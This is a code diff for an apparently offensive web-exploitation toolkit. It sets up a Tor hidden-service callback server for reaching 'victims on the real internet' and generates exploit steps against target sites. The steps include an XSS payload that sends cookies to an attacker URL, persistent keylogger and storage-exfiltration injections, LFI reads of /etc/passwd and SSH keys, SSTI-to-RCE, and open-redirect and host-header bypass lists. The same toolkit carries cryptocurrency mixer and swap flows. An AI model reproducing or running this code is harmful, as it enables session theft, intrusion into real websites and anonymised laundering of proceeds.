@@ -71,7 +71,7 @@ if not _VENV_PY.exists() and not _system_has_deps():
     print(f"  [!] Run: bash install.sh")
     sys.exit(1)
 
-import json, subprocess, shutil, secrets, signal, threading, time as _time_mod, shlex
+import json, subprocess, shutil, secrets, signal, threading, time as _time_mod
 from decimal import Decimal, InvalidOperation
 from urllib.parse import urlparse, quote, urlencode, urljoin
 from dataclasses import dataclass, field
@@ -200,12 +200,29 @@ _SECRETS_TO_STRIP = (
     "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN", "SSH_AUTH_SOCK",
     "GPG_AGENT_INFO", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
 )
+# TOR_CONTROL_PASSWORD is intentionally NOT in _SECRETS_TO_STRIP.
+# Every child script's newnym() call reads it from os.environ to
+# authenticate against the Tor control port — stripping it would
+# silently break circuit rotation on every single mixer / swap /
+# broadcast / intel run. If an operator has TOR_CONTROL_PASSWORD set
+# at all, they've already accepted that any descendant process sees
+# it. paranoia_mode wipes it from the parent env at end-of-session.
 
 
-def _sanitized_env(extra_strip: tuple = ()) -> dict:
-    """Build a sanitized environment with secrets stripped."""
+def _sanitized_env(extra_strip: tuple = (), keep: tuple = ()) -> dict:
+    """Build a sanitized environment with secrets stripped.
+
+    `keep` is a tuple of env var names that should NOT be stripped even
+    if they appear in _SECRETS_TO_STRIP. This is how we let specific
+    subprocesses see the credentials they need (e.g. HIBP_KEY for the
+    intel breach checker) without punching a hole in the default-deny
+    policy for every other subprocess.
+    """
     env = os.environ.copy()
+    keep_set = set(keep)
     for _k in _SECRETS_TO_STRIP + extra_strip:
+        if _k in keep_set:
+            continue
         env.pop(_k, None)
     env["HISTFILE"] = "/dev/null"
     return env
@@ -276,11 +293,18 @@ def _jittered_delay(lo: float = 1.0, hi: float = 4.0) -> None:
     _time_mod.sleep(lo + secrets.randbelow(ms_range) / 1000.0)
 
 
-def run_script(path: Path, args: list, label: str = ""):
+def run_script(path: Path, args: list, label: str = "",
+               keep_env: tuple = ()):
+    """Launch a child script under the toolkit's sanitized env.
+
+    `keep_env` is a whitelist of env vars the child is allowed to see
+    even though they're normally stripped (API keys for intel scans,
+    wallet password for signing, etc.).
+    """
     if label:
         info(f"Running {label}...")
     python = sys.executable
-    child_env = _sanitized_env()
+    child_env = _sanitized_env(keep=keep_env)
     try:
         result = subprocess.run(
             [python, str(path)] + args,
@@ -312,12 +336,30 @@ class ExploitFileManager:
         self._ttl = ttl_seconds
         self._files: dict = {}  # path -> {created, type, ttl}
         self._lock = threading.Lock()
-        if Path("/dev/shm").exists():
-            self._base = Path("/dev/shm/intel")
+        # Prefer /dev/shm (tmpfs — contents stay off spinning rust).
+        # Also verify it's writable by the current user; on some
+        # hardened distros /dev/shm exists but is 1777 mounted read-
+        # only or with noexec set. If the write probe fails, fall back
+        # to an under-toolkit tmpdir and flag disk_warning so the
+        # walkthrough banner tells the operator.
+        self._disk_warning = True
+        shm = Path("/dev/shm")
+        if shm.is_dir() and os.access(str(shm), os.W_OK):
+            self._base = shm / "intel"
+            self._disk_warning = False
         else:
             self._base = ROOT / ".intel_tmp"
+        # Permissions matter: on a shared host, leaving the dir at the
+        # default (0755) means every other user can see what we
+        # generated. 0700 restricts it to the current uid.
         self._base.mkdir(parents=True, exist_ok=True)
-        self._disk_warning = not Path("/dev/shm").exists()
+        try:
+            os.chmod(str(self._base), 0o700)
+        except OSError:
+            # chmod may fail on exotic filesystems. Not fatal —
+            # individual files are 0600 via generate(), so the dir
+            # entry names might leak but the contents don't.
+            pass
 
     @property
     def disk_warning(self) -> bool:
@@ -635,6 +677,12 @@ class AttackerInfra:
             if self._running and self._port:
                 return self._port
 
+            # Pick a free ephemeral port. We close the probe socket
+            # before binding the real server, so there is a tiny race
+            # window where another process could grab it. In practice
+            # that never happens on a single-user loopback, but we
+            # retry a handful of times if ThreadingHTTPServer's bind
+            # fails below.
             import socket
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.bind(("127.0.0.1", 0))
@@ -914,8 +962,27 @@ class AttackerInfra:
                     )
                     hself._send_beacon()
 
-            self._server = ThreadingHTTPServer(("127.0.0.1", self._port),
-                                               _Handler)
+            # Retry port pick + bind if the ephemeral port we claimed
+            # was grabbed by another process between probe and bind.
+            self._server = None
+            _bind_err = None
+            for _attempt in range(5):
+                try:
+                    self._server = ThreadingHTTPServer(
+                        ("127.0.0.1", self._port), _Handler,
+                    )
+                    break
+                except OSError as _e:
+                    _bind_err = _e
+                    # Claim a fresh port and retry.
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _rs:
+                        _rs.bind(("127.0.0.1", 0))
+                        self._port = _rs.getsockname()[1]
+            if self._server is None:
+                raise RuntimeError(
+                    f"AttackerInfra: couldn't bind a loopback port after "
+                    f"5 attempts ({_bind_err})"
+                )
             self._server.daemon_threads = True
             self._started.clear()
 
@@ -1160,17 +1227,28 @@ class AuditTrail:
             return list(self._alerts)
 
     def get_stats(self) -> dict:
-        """Return summary statistics for the session."""
+        """Return summary statistics for the session.
+
+        Counts both the legacy 'execute' action (log_execution) and
+        the StepExecutor's 'exploit_step' action (used for every HTTP
+        step in the smart walkthrough). Without that, every stat that
+        the session-end banner prints — executions, successes,
+        failures — read as 0 even after dozens of real steps had run.
+        """
+        exec_actions = {"execute", "exploit_step"}
         with self._lock:
             total = len(self._entries)
-            executions = sum(1 for e in self._entries if e["action"] == "execute")
+            executions = sum(1 for e in self._entries
+                             if e["action"] in exec_actions)
             skips = sum(1 for e in self._entries if e["action"] == "skip")
             files = sum(1 for e in self._entries if e["action"] == "file_generated")
             edits = sum(1 for e in self._entries if e["action"] == "edit_run")
             successes = sum(1 for e in self._entries
-                           if e["action"] == "execute" and e.get("success") is True)
+                           if e["action"] in exec_actions
+                           and e.get("success") is True)
             failures = sum(1 for e in self._entries
-                           if e["action"] == "execute" and e.get("success") is False)
+                           if e["action"] in exec_actions
+                           and e.get("success") is False)
             vuln_types = set(e["vuln_type"] for e in self._entries if e["vuln_type"])
             alert_count = len(self._alerts)
 
@@ -1443,8 +1521,16 @@ class StepExecutor:
         self._client = client
         self._audit = audit
 
-    def execute_step(self, step: dict, vuln_type: str = "") -> Optional[ExploitResult]:
-        """Execute a single exploit step. Returns ExploitResult or None if aborted."""
+    def execute_step(self, step: dict, vuln_type: str = "",
+                     skip_low_risk_confirm: bool = False) -> Optional[ExploitResult]:
+        """Execute a single exploit step. Returns ExploitResult or None if aborted.
+
+        skip_low_risk_confirm: when the caller has already asked the
+        operator whether to run this step (e.g. _run_steps_smart's
+        r=run prompt), don't prompt a second time for low/medium-risk
+        steps. HIGH and CRITICAL always confirm regardless — those are
+        destructive enough to warrant a per-step check.
+        """
         risk = step.get("risk", "MEDIUM")
         if step.get("warning") and risk not in ("HIGH", "CRITICAL"):
             risk = "HIGH"
@@ -1467,7 +1553,7 @@ class StepExecutor:
                 self._audit.log("abort", f"rejected: {step.get('title', '')[:40]}", risk=risk)
                 return None
         else:
-            if not confirm("Execute through Tor?"):
+            if not skip_low_risk_confirm and not confirm("Execute through Tor?"):
                 return None
 
         req = step.get("request")
@@ -1479,6 +1565,7 @@ class StepExecutor:
         params = req.get("params")
         data = req.get("data")
         headers = req.get("headers")
+        allow_redirects = req.get("allow_redirects", True)
 
         if not url:
             err("No URL in step request")
@@ -1496,8 +1583,14 @@ class StepExecutor:
         info(f"{method} {url[:70]}...")
         result = self._client.request(
             method=method, url=url, params=params, data=data,
-            headers=headers,
+            headers=headers, allow_redirects=allow_redirects,
         )
+
+        # Default success for the audit: the HTTP exchange itself completed
+        # cleanly (2xx/3xx, no transport error). A validator, when present,
+        # overrides this with a semantic verdict (vuln confirmed / not).
+        if not result.error and 200 <= result.status_code < 400:
+            result.success = True
 
         # Run validation callback if provided
         validate = step.get("validate")
@@ -2047,7 +2140,8 @@ def flow_receive(detected_port=None):
         _swap_outfile = str(ROOT / f"thor_pairs_{os.urandom(4).hex()}.json")
         swap_args = ["--amounts", btc_amt, "--dests", _addr, "--tor-proxy", tor,
                      "--outfile", _swap_outfile, "--force"]
-        if not run_script(CORE / "thor_swap_preparer", swap_args, "Swap preparer"):
+        if not run_script(CORE / "thor_swap_preparer", swap_args, "Swap preparer",
+                           keep_env=("COINGECKO_API_KEY",)):
             err("Swap preparation failed.")
             return
     else:
@@ -2333,7 +2427,8 @@ def flow_swap_preparer(detected_port=None):
     _outfile = str(ROOT / f"thor_pairs_{os.urandom(4).hex()}.json")
     args = ["--amounts", amt, "--dests", dest, "--tor-proxy", tor,
             "--outfile", _outfile, "--force"]
-    if not run_script(CORE / "thor_swap_preparer", args, "Swap preparer"):
+    if not run_script(CORE / "thor_swap_preparer", args, "Swap preparer",
+                       keep_env=("COINGECKO_API_KEY",)):
         err("Swap preparation failed.")
     else:
         ok("Deposit instructions generated — see output above.")
@@ -2362,7 +2457,11 @@ def flow_exit_planner(detected_port=None):
         err(f"Unknown method: {method}")
         return
     args = [amt, "--method", method, "--tor-proxy", tor]
-    run_script(CORE / "exit_strategy_planner", args, "Exit planner")
+    if run_script(CORE / "exit_strategy_planner", args, "Exit planner",
+                   keep_env=("COINGECKO_API_KEY",)):
+        ok("Exit plan generated.")
+    else:
+        err("Exit planning failed — see output above.")
 
 
 def _detect_iface() -> str:
@@ -2427,10 +2526,14 @@ def flow_testnet(detected_port=None):
         wf = prompt("Wallet JSON (or press Enter to create one)", str(wallet_files[0]))
     else:
         info("No wallet found — creating one first...")
-        run_script(CORE / "create_receive_wallet", ["--rpc", rpc, "--tor-proxy", tor], "Wallet creator")
+        if not run_script(CORE / "create_receive_wallet",
+                           ["--rpc", rpc, "--tor-proxy", tor],
+                           "Wallet creator"):
+            err("Wallet creator failed — cannot continue dry run.")
+            return
         wallet_files = _find_wallet_files()
         if not wallet_files:
-            err("Failed to create wallet")
+            err("Wallet creator ran but no wallet_*.json was produced.")
             return
         wf = str(wallet_files[0])
 
@@ -2621,7 +2724,14 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
     # ── Target URL override ──
     custom_url = prompt("Override target URL (or Enter to use detected)", "")
     if custom_url.strip():
-        base_url = custom_url.strip()
+        custom_url = custom_url.strip().rstrip("/")
+        # Accept either a full URL or a bare host — the rest of the
+        # walkthrough assumes base_url has a scheme so urlparse().netloc
+        # works. Defaulting to https:// is safer than http://.
+        if not (custom_url.startswith("http://") or
+                custom_url.startswith("https://")):
+            custom_url = f"https://{custom_url}"
+        base_url = custom_url
         audit.log("url_override", f"target changed to: {base_url[:60]}")
         ok(f"Target URL set to: {base_url}")
         print()
@@ -2681,10 +2791,40 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
             ok(f"Hidden service: {onion_host}")
             audit.log("hs_start", onion_host, risk=AuditTrail.RISK_MEDIUM)
         else:
-            warn("Hidden service setup failed (is tor ControlPort open with "
-                 "CookieAuth or HashedControlPassword?). Falling back to local.")
-            info("For real victims: expose the port through your own tunnel.")
-            infra_mode = "local"
+            # Silent fallback to 'local' mode would render every
+            # exploit payload unreachable — victims on the real
+            # internet can't hit 127.0.0.1. Previously the operator
+            # would learn this only when captures never arrived. Make
+            # them consciously opt out of onion mode.
+            err("Hidden service setup FAILED. Likely reasons:")
+            err("  * Tor ControlPort not open (add 'ControlPort 9051'")
+            err("    to /etc/tor/torrc and restart tor)")
+            err("  * Neither CookieAuthentication nor HashedControlPassword")
+            err("    is configured (add 'CookieAuthentication 1' to torrc,")
+            err("    or set TOR_CONTROL_PASSWORD env before launching).")
+            err("  * stem python package not importable under this venv.")
+            err("")
+            err("Without an onion, victims on the real internet cannot")
+            err("reach your callback server. You have three options:")
+            err("  1. abort this walkthrough, fix the Tor control port,")
+            err("     and retry with 'onion' again")
+            err("  2. fall back to 'local' (loopback only — LAB USE ONLY)")
+            err("  3. fall back to 'custom' (you'll be prompted for a")
+            err("     reachable URL that proxies to the local server)")
+            _choice = prompt("Choose 1/2/3 (default: 1 = abort)", "1").strip()
+            if _choice == "2":
+                warn("Continuing in 'local' mode — callbacks WILL NOT "
+                     "be received from real targets.")
+                infra_mode = "local"
+            elif _choice == "3":
+                info("Switching to 'custom' mode.")
+                infra_mode = "custom"
+            else:
+                audit.log("hs_setup_failed_abort",
+                          "operator aborted after onion failure",
+                          risk=AuditTrail.RISK_MEDIUM)
+                err("Aborting walkthrough.")
+                return client, executor
 
     if infra_mode == "local":
         attacker_url = f"http://127.0.0.1:{local_port}"
@@ -2754,7 +2894,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
 
     sel = prompt("Enter number (or 'all' for sequential, 'q' to quit)", "all")
     if sel.lower() in ("q", "quit"):
-        return
+        return client, executor
 
     if sel.isdigit():
         idx = int(sel) - 1
@@ -2762,7 +2902,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
             targets = [exploitable[idx]]
         else:
             err(f"Invalid number: {sel}")
-            return
+            return client, executor
     else:
         targets = exploitable
 
@@ -3044,7 +3184,12 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 continue
 
             if action in ("r", "run"):
-                result = executor.execute_step(step, vuln_type=etype)
+                # Operator already said 'r' at the step prompt; don't ask
+                # a second time for low/medium-risk steps. HIGH/CRITICAL
+                # still confirm inside execute_step regardless.
+                result = executor.execute_step(
+                    step, vuln_type=etype, skip_low_risk_confirm=True,
+                )
                 if result:
                     chain_data["last_output"] = result.response_body[:5000]
                     chain_data[f"{etype}_output_{step_idx}"] = result.response_body[:2000]
@@ -3320,18 +3465,20 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     import re as _re
 
-    def _get(url: str, extra_params: dict = None, extra_headers: dict = None) -> dict:
+    def _get(url: str, extra_params: dict = None, extra_headers: dict = None,
+             allow_redirects: bool = True) -> dict:
         """Build a GET request dict."""
-        r = {"method": "GET", "url": url}
+        r = {"method": "GET", "url": url, "allow_redirects": allow_redirects}
         if extra_params:
             r["params"] = extra_params
         if extra_headers:
             r["headers"] = extra_headers
         return r
 
-    def _get_param(val: str) -> dict:
+    def _get_param(val: str, allow_redirects: bool = True) -> dict:
         """Build GET to target_base with param=val."""
-        return _get(target_base, extra_params={param: val})
+        return _get(target_base, extra_params={param: val},
+                    allow_redirects=allow_redirects)
 
     def _post(url: str, data: dict = None, extra_headers: dict = None) -> dict:
         r = {"method": "POST", "url": url}
@@ -3671,6 +3818,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         _m_svg = f"s{secrets.token_hex(4)}"
         _m_attr = f"a{secrets.token_hex(4)}"
         _m_js_ctx = f"j{secrets.token_hex(4)}"
+        _m_steal = f"k{secrets.token_hex(4)}"
 
         steps = [
             {"title": "Check reflection (benign marker)",
@@ -3699,12 +3847,18 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "validate": _xss_reflect_check(_m_js_ctx),
              "note": "If the param is reflected inside a JS string, ' breaks out"},
             {"title": "Cookie exfiltration payload",
+             # Per-step unique marker embedded as a JS comment inside the
+             # payload. Previously validated on the generic phrase
+             # 'new Image', which appears in legitimate JavaScript on
+             # plenty of target pages and produced false positives. The
+             # marker is alphanumeric-only so it survives JS parsers
+             # unchanged when reflected.
              "request": _get_param(
-                 "<script>new Image().src='[ATTACKER]/c?c='"
+                 f"<script>/*{_m_steal}*/new Image().src='[ATTACKER]/c?c='"
                  "+encodeURIComponent(document.cookie)"
                  "+'&u='+encodeURIComponent(location.href)"
                  "+'&r='+encodeURIComponent(document.referrer)</script>"),
-             "validate": _xss_reflect_check("new Image", "<script"),
+             "validate": _xss_reflect_check(_m_steal, "<script"),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
             {"title": "Generate credential phishing page",
@@ -3717,6 +3871,18 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
+        # Stored XSS has TWO paths: the INJECT endpoint (where we POST
+        # the payload) and the RENDER endpoint (where victims see it).
+        # The scanner sets finding.test_url to the render URL so the
+        # report's replay link points at the visible result — but the
+        # walkthrough needs to POST at the inject endpoint, or every
+        # payload lands on the render page where no form handler
+        # exists. Reconstruct inject_url from base_url + exploit_info.path.
+        inject_path = ei.get("path", "")
+        if inject_path:
+            inject_url = base_url.rstrip("/") + inject_path
+        else:
+            inject_url = target
         def _sxss_verify(r: ExploitResult):
             if "<script>" in r.response_body.lower() or "onerror=" in r.response_body.lower():
                 r.success = True
@@ -3754,48 +3920,66 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         )
         steps = [
             {"title": "Beacon (confirm render without stealing)",
-             "request": _post(target, {param: _beacon}),
-             "note": "Harmless ping — lets you confirm the XSS fires before "
-                     "pushing sensitive payloads.",
+             "request": _post(inject_url, {param: _beacon}),
+             "note": f"Harmless ping — POSTs to {inject_path or '(origin)'} "
+                     "so you can confirm the XSS fires at "
+                     f"{render} before pushing sensitive payloads.",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent cookie-stealing payload",
-             "request": _post(target, {param: _cookie_steal}),
+             "request": _post(inject_url, {param: _cookie_steal}),
              "warning": "Injects a persistent payload",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent keylogger payload",
-             "request": _post(target, {param: _keylog}),
+             "request": _post(inject_url, {param: _keylog}),
              "warning": "Injects persistent keylogger (buffers + batches keys)",
              "risk": "CRITICAL"},
             {"title": "Inject storage exfiltration payload",
-             "request": _post(target, {param: _storage_dump}),
+             "request": _post(inject_url, {param: _storage_dump}),
              "warning": "Dumps cookies + localStorage + sessionStorage to /s",
              "risk": "CRITICAL"},
             {"title": "Verify payload renders",
              "request": _get(base_url.rstrip("/") + render),
              "validate": _sxss_verify,
-             "note": "Checks if injected script appears on the render page"},
+             "note": f"Fetches {render} to confirm the injected script appears"},
         ]
 
     elif etype == "lfi":
+        # /etc/passwd shape: `^user:[x*!]?:\d+:\d+:...` appearing as a
+        # line. Require a regex match, not just substring — a blog post
+        # that mentions the string "root:" wouldn't match the line shape.
+        _passwd_row = _re.compile(
+            r"^[A-Za-z0-9_.-]+:[x*!]?:\d+:\d+:", _re.M
+        )
+        # Config-file heuristics: only trigger when the keyword appears
+        # in a KEY=VALUE or KEY: VALUE shape with a value. A page that
+        # mentions the word 'password' in prose doesn't match.
+        _config_like = _re.compile(
+            r"(?mi)^\s*(?:DB_PASSWORD|DB_HOST|DB_USER|API_KEY|SECRET|"
+            r"ACCESS_KEY_ID|AWS_SECRET|REDIS_PASSWORD|MYSQL_PASSWORD)"
+            r"\s*[:=]\s*\S"
+        )
+
         def _lfi_check(r: ExploitResult):
             body = r.response_body
-            if "root:" in body and ":0:0:" in body:
+            if _passwd_row.search(body):
                 r.success = True
                 r.confidence = 0.95
-                r.evidence = "Unix /etc/passwd content detected"
+                r.evidence = "Unix /etc/passwd row detected"
                 r.false_positive_risk = "very_low"
-            elif "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
+                return
+            if "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
                 r.success = True
                 r.confidence = 0.95
                 r.evidence = "SSH private key content detected"
                 r.false_positive_risk = "very_low"
-            elif r.status_code == 200 and len(body) > 20:
-                if any(s in body.lower() for s in ("password", "db_host", "api_key", "secret")):
+                return
+            if r.status_code == 200 and len(body) > 20:
+                if _config_like.search(body):
                     r.success = True
-                    r.confidence = 0.7
-                    r.evidence = "Sensitive keywords in response"
+                    r.confidence = 0.75
+                    r.evidence = "Config-file KEY=VALUE entries detected"
                     r.false_positive_risk = "medium"
 
         # Adaptive traversal depths
@@ -4097,22 +4281,45 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                           "validate": _ssrf_check, "note": f"Internal service: {name}"})
 
     elif etype == "ssti":
+        # Use per-session arithmetic markers so a response containing a
+        # literal '49' (phone number, timestamp, ID) doesn't get
+        # flagged as template evaluation. The raw expression must NOT
+        # appear in the response body (that would mean the server just
+        # echoed our input) AND the computed result MUST appear.
+        _ssti_a = secrets.randbelow(60) + 20   # 20..79
+        _ssti_b = secrets.randbelow(60) + 20
+        _ssti_expected = str(_ssti_a * _ssti_b)   # 400..6241, distinctive
+        _ssti_raw = f"{_ssti_a}*{_ssti_b}"
+
         def _ssti_check(r: ExploitResult):
-            if "49" in r.response_body:
-                r.success = True
-                r.confidence = 0.9
-                r.evidence = "49 found — template expression evaluated"
-                r.false_positive_risk = "low"
-            elif _re.search(r"uid=\d+", r.response_body):
+            body = r.response_body
+            if _re.search(r"uid=\d+", body):
                 r.success = True
                 r.confidence = 0.95
                 r.evidence = "OS command output in template response"
                 r.false_positive_risk = "very_low"
+                return
+            # Require the expected numeric result to appear, and the raw
+            # expression to NOT appear (otherwise the server just echoed
+            # the input).
+            if _ssti_expected in body and _ssti_raw not in body:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = (f"Template expression evaluated: "
+                              f"{_ssti_a}*{_ssti_b}={_ssti_expected}")
+                r.false_positive_risk = "low"
+            elif _ssti_raw in body:
+                r.confidence = 0.25
+                r.evidence = "Expression echoed — likely just reflection"
+                r.false_positive_risk = "high"
 
         ssti_payloads = [
-            ("Jinja2/Twig (7*7)", "{{7*7}}"),
-            ("Freemarker/Velocity", "${7*7}"),
-            ("ERB/EJS", "<%= 7*7 %>"),
+            (f"Jinja2/Twig ({_ssti_a}*{_ssti_b})",
+             f"{{{{{_ssti_a}*{_ssti_b}}}}}"),
+            (f"Freemarker/Velocity ({_ssti_a}*{_ssti_b})",
+             f"${{{_ssti_a}*{_ssti_b}}}"),
+            (f"ERB/EJS ({_ssti_a}*{_ssti_b})",
+             f"<%= {_ssti_a}*{_ssti_b} %>"),
         ]
         steps = []
         for name, payload in ssti_payloads:
@@ -4120,7 +4327,9 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 "title": f"Test {name}",
                 "request": _get_param(payload),
                 "validate": _ssti_check,
-                "note": f"49 in response = {name} engine confirmed",
+                "note": (f"{_ssti_expected} in response (without the raw "
+                         f"'{_ssti_raw}' expression) = {name} engine "
+                         f"confirmed"),
             })
         steps.extend([
             {"title": "Jinja2 RCE: read /etc/passwd",
@@ -4213,12 +4422,30 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "idor":
+        # IDOR verification needs TWO signals: the ID returns 200 AND the
+        # body doesn't look like an access-denial page. The previous
+        # 'any 200 with >20 bytes' check marked login/forbidden pages
+        # as successful IDOR hits, because those are normally 200 with
+        # HTML bodies. Now filters out common denial patterns.
+        _idor_deny_pat = _re.compile(
+            r"(?:access\s+denied|permission\s+denied|unauthori[sz]ed|"
+            r"not\s+authori[sz]ed|please\s+(?:log|sign)\s+in|"
+            r"login\s+required|forbidden)",
+            _re.I,
+        )
+
         def _idor_check(r: ExploitResult):
             if r.status_code == 200 and len(r.response_body) > 20:
-                r.success = True
-                r.confidence = 0.6
-                r.evidence = f"Got {len(r.response_body)} bytes for this ID"
-                r.false_positive_risk = "medium"
+                if _idor_deny_pat.search(r.response_body[:5000]):
+                    r.evidence = (f"HTTP 200 but response looks like a "
+                                  f"denial/login page — not IDOR")
+                    r.confidence = 0.15
+                    r.false_positive_risk = "high"
+                else:
+                    r.success = True
+                    r.confidence = 0.6
+                    r.evidence = f"Got {len(r.response_body)} bytes for this ID"
+                    r.false_positive_risk = "medium"
             elif r.status_code == 403:
                 r.evidence = "403 Forbidden — access denied for this ID"
             elif r.status_code == 404:
@@ -4562,11 +4789,16 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             ("Cache poisoning (X-Forwarded-Host)",
              f"%0d%0aX-Forwarded-Host:%20{_sess_marker}.[ATTACKER_HOST]"),
         ]
+        # allow_redirects=False so we can read the injected Location /
+        # Set-Cookie headers directly. Following the redirect would
+        # replace r.response_headers with the TARGET's headers (no
+        # injected fields) and the validator would always miss the
+        # smoking-gun evidence.
         steps = []
         for name, payload in crlf_payloads:
             steps.append({
                 "title": f"CRLF: {name}",
-                "request": _get_param(payload),
+                "request": _get_param(payload, allow_redirects=False),
                 "validate": _crlf_check,
                 "note": f"Injecting via {name} (marker: {_sess_marker})",
                 "warning": name,
@@ -4618,30 +4850,583 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             r.confidence = 0.2
 
         redirect_payloads = [
+            # Direct forms
             ("Direct URL", "[ATTACKER]/r"),
             ("Protocol-relative", "//[ATTACKER_HOST]/r"),
-            ("@ bypass",
+            ("Double slash", "///[ATTACKER_HOST]/r"),
+            ("Quadruple slash", "////[ATTACKER_HOST]/r"),
+            # Parser tricks
+            ("@ bypass (target@evil)",
              f"https://{_target_host}@[ATTACKER_HOST]/r"
              if _target_host else "https://[ATTACKER_HOST]/r"),
+            ("? suffix",
+             f"[ATTACKER]/r?{_target_host}" if _target_host
+             else "[ATTACKER]/r"),
+            ("# suffix",
+             f"[ATTACKER]/r#{_target_host}" if _target_host
+             else "[ATTACKER]/r"),
+            # Whitespace / control char
             ("Backslash bypass", "/\\[ATTACKER_HOST]/r"),
+            ("Backslash (double)", "\\\\[ATTACKER_HOST]/r"),
+            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
+            ("Newline prefix", "%0a//[ATTACKER_HOST]/r"),
+            ("Tab+slash prefix", "%09/[ATTACKER_HOST]/r"),
+            # Encoding tricks
             ("URL-encoded scheme",
              "%68%74%74%70%3a%2f%2f[ATTACKER_HOST]/r"),
-            ("Double slash", "///[ATTACKER_HOST]/r"),
-            ("Whitespace prefix", "%09//[ATTACKER_HOST]/r"),
+            ("Double URL-encoded scheme",
+             "%2568%2574%2574%2570%253a%252f%252f[ATTACKER_HOST]/r"),
+            ("Encoded slashes",
+             "%2F%2F[ATTACKER_HOST]/r"),
+            # Unicode confusables — some browsers/servers normalize
+            # these to ASCII before redirect, others don't.
+            ("Unicode bullet",
+             "/\u2044[ATTACKER_HOST]/r"),
+            # Target-prefixed lookalikes
+            ("Evil TLD swap",
+             f"[SCHEME]://{_target_host}.evil-attacker.com/r"
+             if _target_host else "[ATTACKER]/r"),
+            ("Target-as-subdomain",
+             "[SCHEME]://evilsub.[ATTACKER_HOST]/r"),
+            # Relative resolution inside scheme-less
+            ("Data URI",
+             "data:text/html,<script>location='[ATTACKER]'</script>"),
+            ("Javascript URI (reflective XSS upgrade)",
+             "javascript://[ATTACKER_HOST]/%0aalert(1)"),
         ]
+        # [SCHEME] placeholder — default to https when substituting.
+        redirect_payloads = [
+            (name, p.replace("[SCHEME]", "https"))
+            for name, p in redirect_payloads
+        ]
+        # allow_redirects=False is CRITICAL for every step in this branch:
+        # the validator reads Location from r.response_headers. When we
+        # let requests follow the redirect, r.response_headers is the
+        # headers of the redirect TARGET (usually 200, no Location) and
+        # every check silently returns 'no redirect' — the walkthrough
+        # ends up looking like the bypass didn't work even on a
+        # vulnerable target.
         steps = [
             {"title": "Confirm original redirect",
-             "request": _get(target),
+             "request": _get(target, allow_redirects=False),
              "validate": _redir_check,
              "note": "Check Location header baseline"},
         ]
         for name, payload in redirect_payloads:
             steps.append({
                 "title": f"Redirect bypass: {name}",
-                "request": _get_param(payload),
+                "request": _get_param(payload, allow_redirects=False),
                 "validate": _redir_check,
                 "note": f"Testing {name} bypass → attacker host",
             })
+
+    elif etype == "host_header_injection":
+        # Host header injection — reflect attacker-controlled Host into
+        # Location or into rendered absolute URLs. allow_redirects=False
+        # so we read the Location directly.
+        _hh_marker = f"hh{secrets.token_hex(4)}.example.test"
+        _hh_target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
+                           if "//" in base_url else "")
+
+        def _hh_check(r: ExploitResult):
+            loc = (r.response_headers.get("Location", "") or
+                   r.response_headers.get("location", ""))
+            if loc:
+                loc_host = urlparse(loc).netloc.lower()
+                if loc_host == _hh_marker.lower():
+                    r.success = True
+                    r.confidence = 0.95
+                    r.evidence = f"Location reflected marker host: {loc[:100]}"
+                    r.false_positive_risk = "very_low"
+                    return
+            body = r.response_body or ""
+            if _hh_marker in body:
+                if (f"//{_hh_marker}" in body or
+                        f"://{_hh_marker}" in body or
+                        _re.search(
+                            r"""(?:href|src|action)\s*=\s*['"][^'"]*"""
+                            + _re.escape(_hh_marker)
+                            + r"""[^'"]*['"]""", body, _re.I)):
+                    r.success = True
+                    r.confidence = 0.85
+                    r.evidence = "Marker rendered as absolute URL in body"
+                    r.false_positive_risk = "low"
+                    return
+                r.confidence = 0.4
+                r.evidence = "Marker appeared in body but not URL-ish"
+            elif r.status_code:
+                r.evidence = f"HTTP {r.status_code}, no reflection"
+                r.confidence = 0.1
+
+        def _hh_request(header_name: str) -> dict:
+            return _get(target, extra_headers={header_name: _hh_marker},
+                        allow_redirects=False)
+
+        steps = [
+            {"title": "Baseline (no injection)",
+             "request": _get(target, allow_redirects=False),
+             "validate": lambda r: setattr(
+                 r, 'evidence',
+                 f"Baseline HTTP {r.status_code}, "
+                 f"Location: {r.response_headers.get('Location', '-')[:80]}"),
+             "note": "Capture server's normal Location so comparisons mean something"},
+            {"title": "Host header reflection",
+             "request": _hh_request("Host"),
+             "validate": _hh_check,
+             "warning": "Some WAFs / load balancers reject unexpected Host",
+             "note": "Most password-reset link injection flows key off Host"},
+            {"title": "X-Forwarded-Host reflection",
+             "request": _hh_request("X-Forwarded-Host"),
+             "validate": _hh_check,
+             "note": "Framework reads X-Forwarded-Host when behind a proxy"},
+            {"title": "X-Forwarded-Server reflection",
+             "request": _hh_request("X-Forwarded-Server"),
+             "validate": _hh_check,
+             "note": "Apache/nginx sometimes honor this"},
+            {"title": "X-Host reflection",
+             "request": _hh_request("X-Host"),
+             "validate": _hh_check,
